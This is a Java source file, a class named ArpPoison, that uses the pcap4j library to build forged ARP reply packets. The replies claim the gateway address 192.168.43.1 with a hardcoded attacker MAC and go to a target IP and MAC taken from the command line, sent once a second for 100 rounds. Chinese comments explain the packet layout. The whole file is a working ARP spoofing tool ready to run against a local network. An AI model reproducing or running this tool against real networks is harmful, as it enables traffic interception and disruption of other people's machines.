package com.litchi;

import java.io.IOException;
import java.net.InetAddress;
import java.net.UnknownHostException;
import org.pcap4j.core.NotOpenException;
import org.pcap4j.core.PcapHandle;
import org.pcap4j.core.PcapNativeException;
import org.pcap4j.core.PcapNetworkInterface;
import org.pcap4j.core.PcapNetworkInterface.PromiscuousMode;
import org.pcap4j.packet.ArpPacket;
import org.pcap4j.packet.EthernetPacket;
import org.pcap4j.packet.Packet;
import org.pcap4j.packet.namednumber.ArpHardwareType;
import org.pcap4j.packet.namednumber.ArpOperation;
import org.pcap4j.packet.namednumber.EtherType;
import org.pcap4j.util.ByteArrays;
import org.pcap4j.util.MacAddress;
import org.pcap4j.util.NifSelector;


public class ArpPoison {
    /**
     * SNAPLEN 报文的最大长度
     */
    private final static Integer SNAPLEN=65536;
    /**
     * READ_TIMEOUT 读取过期的时间
     */
    private final static Integer READ_TIMEOUT=10;
    /**
     * SRC_MAC_ADDR 攻击机的MAC地址
     */
    private final static MacAddress SRC_MAC_ADDR=MacAddress.getByName("70-1C-E7-91-7F-6C");
    /**
     * COUNT 循环的次数
     */
    private final static Integer COUNT=100;
    public static void main(String[] args) throws PcapNativeException, NotOpenException {
        String strSrcIpAddress = "192.168.43.1";
        //传入目标机的IP地址
        String strDstIpAddress = args[0];
        //传入目标机的MAC地址
        String strDstMacAddress= args[1];
        //网卡接口
        PcapNetworkInterface nif;
        try {
            //提供网卡选择，这里根据不同的主机选择
            nif = new NifSelector().selectNetworkInterface();
        } catch (IOException e) {
            e.printStackTrace();
            return;
        }

        if (nif == null) {
            return;
        }

        System.out.println(nif.getName() + "(" + nif.getDescription() + ")");
        //开启一个PcapHandle用来发送回复包
        PcapHandle sendHandle = nif.openLive(SNAPLEN, PromiscuousMode.PROMISCUOUS, READ_TIMEOUT);
        try {
            ArpPacket.Builder arpBuilder = new ArpPacket.Builder();
            try {
                //创建一个arp回复，根据arp回复的格式创建，
                // 以太网  | 以太网 | 帧  | 硬件 | 协议| 硬件 | 协议 | OP| 发送端   |发送端|目的以太|目的
                // 目的地址 | 源地址 | 类型| 类型 | 类型| 长度 | 长度 |   |以太网地址|  IP  |网地址  | IP
                //  6         6      2    2      2      1     1   2     6       4      6       4
                //|<---以太网首部-------->|<-------------------28字节的ARP请求/应答------------->|
                arpBuilder
                        .hardwareType(ArpHardwareType.ETHERNET)
                        .protocolType(EtherType.IPV4)
                        .hardwareAddrLength((byte) MacAddress.SIZE_IN_BYTES)
                        .protocolAddrLength((byte) ByteArrays.INET4_ADDRESS_SIZE_IN_BYTES)
                        .operation(ArpOperation.REPLY)
                        .srcHardwareAddr(SRC_MAC_ADDR)
                        .srcProtocolAddr(InetAddress.getByName(strSrcIpAddress))
                        .dstHardwareAddr(MacAddress.getByName(strDstMacAddress))
                        .dstProtocolAddr(InetAddress.getByName(strDstIpAddress));
            } catch (UnknownHostException e) {
                throw new IllegalArgumentException(e);
            }
            //构建ARP包的以太网首部部分
            EthernetPacket.Builder etherBuilder = new EthernetPacket.Builder();
            etherBuilder
                    .dstAddr(MacAddress.getByName(strDstMacAddress))
                    .srcAddr(SRC_MAC_ADDR)
                    .type(EtherType.ARP)
                    .payloadBuilder(arpBuilder)
                    .paddingAtBuild(true);

            for (int i = 0; i < COUNT; i++) {
                Packet p = etherBuilder.build();
                System.out.println(p);
                //发送
                sendHandle.sendPacket(p);
                try {
                    Thread.sleep(1000);
                } catch (InterruptedException e) {
                    break;
                }
            }
        } finally {
            if (sendHandle != null && sendHandle.isOpen()) {
                sendHandle.close();
            }
        }
    }

}
